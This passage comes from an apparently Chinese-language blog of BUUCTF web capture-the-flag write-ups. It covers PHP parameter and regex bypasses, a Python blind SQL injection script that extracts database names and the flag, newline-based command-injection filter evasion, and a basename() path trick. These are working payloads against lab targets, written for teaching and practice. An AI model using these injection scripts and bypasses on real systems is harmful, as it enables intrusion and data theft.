class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>); <span class="comment">//不能有下划线和(%5f是下划线的url编码) </span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure><p><code>$_SERVER[&#39;QUERY_STRING&#39;] </code>就是附带的参数的键和值,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/aaa/index.php?p=222&amp;q=333</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&amp;q=333&quot;;</span><br></pre></td></tr></table></figure><p>这里利用PHP的字符串解析特性:</p><blockquote><p><strong>PHP在将查询字符串解析为变量时 会去掉开头的空格,并把一些特殊字符转化为下划线</strong></p></blockquote><p>下一步绕过正则匹配,这里多传一个换行符, 这里正则默认是不匹配换行符的</p><p>所以传:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0a</span><br><span class="line">输出:</span><br><span class="line">how smart you are ~</span><br><span class="line"></span><br><span class="line">FLAG is in secrettw.php</span><br></pre></td></tr></table></figure><p>进入<code>secrettw.php</code>,这里说<code>Local access only</code>, 可能需要加<code>xff</code>之类的头, 源码中发现了一串编码:</p><p><img src="/images/buuctf-web2/image-20221025094059162.png" alt="image-20221025094059162"></p><blockquote><p><strong>这一串是<code>jsfuck</code>代码,将一切的<code>JavaScript</code>代码混淆为<code>[]()!+,\&quot;$.:;_&#123;&#125;~=</code>这十八个字符的排列组合</strong></p><p><strong>这些代码是直接可以在控制台执行的</strong></p></blockquote><img src="/images/buuctf-web2/image-20221025093937170.png" alt="image-20221025093937170" style="zoom:50%;" /><p>执行后弹出:<code>alert(&quot;post me Merak)&quot;</code>,这里应该是需要post这个参数</p><p><img src="/images/buuctf-web2/image-20221025094723388.png" alt="image-20221025094723388"></p><p>这里XFF头不起作用,所以更换为了<code>Client-IP</code>头, 同时按照要求POST一个Merak</p><p>得到了下一关的源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>);  <span class="comment"># 先解码</span></span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123;  <span class="comment">#解码后的每一个字符ord转为ascii码之后,加上i*2</span></span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里首先需要满足: <code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>, 通过<code>data://</code>伪协议即可:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2333=data://text/plain,todat is a happy day</span><br></pre></td></tr></table></figure><p>下一步需要通过file参数来读取<code>flag.php</code> , 这里<code>file</code>参数会经过<code>change</code>的处理, 传入编码后的字符串,解码后将每一位的<code>ascii</code>码都加上当前数组下标值得两倍</p><p>那么反过来将<code>flag.php</code>每一位的ascii码都减去下标的两倍就得到 : <code>fj]a&amp;f\b</code>, 再将其编码之后作为参数传进去就行了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secrettw.php?2333=data://text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure><p>注意这里要把上一步传的<code>Merak</code>删掉,不然会在判定该参数是否存在时直接退出.</p><p>查看源码得到flag</p><br><hr><br><h1 id="逻辑盲注-颜值成绩查询"><a href="#逻辑盲注-颜值成绩查询" class="headerlink" title="[逻辑盲注]颜值成绩查询"></a>[逻辑盲注]颜值成绩查询</h1><p>注入题,先尝试输入一些payload看看注入点在哪</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://22ad9de1-c8df-47c0-8c13-822750f017cf.node4.buuoj.cn:81/?stunum=2#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web2/image-20221025123129925.png" alt="image-20221025123129925" style="zoom:67%;" /><p>存在逻辑注入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1^1)</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221025123522202.png" alt="image-20221025123522202"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(3&amp;&amp;2)</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221025123727768.png" alt="image-20221025123727768"></p><p>数据库名长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1&amp;&amp;(length(database())=4))   ---student number not exists.</span><br><span class="line">(1&amp;&amp;(length(database())=3))   ---Hi admin, your score is: 100</span><br></pre></td></tr></table></figure><p>后面使用上面的方法就爆不出数据库名了,不知道为什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1&amp;&amp;ascii((substr(database(),1,1))=ord(c))))</span><br></pre></td></tr></table></figure><p>把<code>&amp;&amp;</code>换成<code>and</code>,这里发现空格被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1/**/and/**/1=1#</span><br><span class="line">Hi admin, your score is: 100</span><br><span class="line">1 and 1=1#</span><br><span class="line">student number not exists.</span><br></pre></td></tr></table></figure><p>爆数据库名:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chars = string.printable[:]  <span class="comment">#返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line">base_url = <span class="string">&quot;http://bb625ab1-7046-49f8-923e-d3312349b26f.node4.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length</span>):</span><br><span class="line">    database_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; length+<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                database_name += c</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">get_database_name(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 库名: ctf</span></span><br></pre></td></tr></table></figure><p>爆表名:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():</span><br><span class="line">    tables_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                tables_name += c</span><br><span class="line">                <span class="built_in">print</span>(tables_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">// 表名:flag</span><br></pre></td></tr></table></figure><p>爆列名:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="built_in">print</span>(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">//列名: flag,value</span><br></pre></td></tr></table></figure><p>爆数据:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr((select/**/group_concat(value)/**/from/**/flag),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">//flag&#123;debd4fbe-9cc4-<span class="number">4e30</span>-9f3e-6a2ad2b04eb5&#125;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="换行符绕正则-RCEService"><a href="#换行符绕正则-RCEService" class="headerlink" title="[换行符绕正则]RCEService"></a>[换行符绕正则]RCEService</h1><img src="/images/buuctf-web2/image-20221025144311248.png" alt="image-20221025144311248" style="zoom:67%;" /><p>需要输入<code>json</code>格式的命令,现场时让键为<code>command</code>发现被过滤了,换成<code>cmd</code>成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;command&quot;:&quot;whoami&quot;&#125;</span><br><span class="line">&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;</span><br><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221025144755368.png" alt="image-20221025144755368"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>使用换行符</strong>来绕过<code>preg_match</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;ls%20/&quot;%0a&#125;</span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;ls%20/home/rceservice&quot;%0a&#125;</span><br><span class="line">flag jail</span><br><span class="line"></span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;tac%20/home/rceservice/flag&quot;%0a&#125;</span><br><span class="line">这里试了几个读文件的命令,都无法执行</span><br><span class="line"></span><br><span class="line">直接使用绝对路径来执行命令</span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;ls%20/bin&quot;%0a&#125;</span><br><span class="line">bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname echo egrep false fgrep findmnt grep gunzip gzexe gzip hostname kill ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ps pwd rbash readlink rm rmdir run-parts sed sh sleep stty su sync tar tempfile touch true umount uname uncompress vdir wdctl which ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew</span><br><span class="line"></span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0a&#125;</span><br><span class="line">flag&#123;d45d20f3-c8ef-45b6-9851-075783c8a91b&#125;</span><br></pre></td></tr></table></figure><p>这里还有个小知识点,这里看到存在<code> /home/rceservice/jail</code></p><blockquote><p>putenv 相当于一个简陋的沙盒, 让 shell 默认从 <code>/home/rceservice/jail</code> 下寻找命令, 后面看的时候发现这个目录下只有一个 ls, 但其实使用绝对路径执行命令 (&#x2F;bin&#x2F;cat) 就能够绕过限制了</p></blockquote><br><hr><br><h1 id="basename-Can-you-guess-it"><a href="#basename-Can-you-guess-it" class="headerlink" title="[basename]Can you guess it?"></a>[basename]Can you guess it?</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; //这里匹配config.php/结尾的字符串</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); //当前php文件对于网站根目录的相对地址</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64)); //转为16进制之后为长度为128的字符串</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;  //比较两个字符串</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里猜数估计是猜不出来了</p><p>漏洞在<code>basename</code>那里, 该函数用于返回路径中的文件名部分,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">basename(&quot;/testweb/home.php&quot;) = &quot;home.php&quot;</span><br><span class="line"></span><br><span class="line">如果设置了扩展名,则输出是不包含扩展名</span><br><span class="line">basename(&quot;/testweb/home.php&quot;,&quot;.php&quot;) = &quot;home&quot;</span><br></pre></td></tr></table></figure><p><code>basename</code>在解析文件路径时,会忽略一部分非<code>ASCII</code>字符</p><p>可以测试一下有哪些字符会被忽略:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$filename</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);    <span class="comment">//变为 index/某字符</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>) === <span class="string">&quot;index.php&quot;</span>)&#123;  <span class="comment">//如果basename将&quot;/某字符&quot;删除, 则说明这个字符会被其忽略</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果显示: <code>ascii</code>值为47、128-255的字符均会被其删除,其中47为”&#x2F;“, 另外会被删除的还包括汉字和中文标点</p><p>那么在本题中, 要绕过匹配,则可以传<code>config.php/%ff</code> 这里<code>%ff</code>在后面会被<code>basename</code>删除,所以不影响读取该文件, 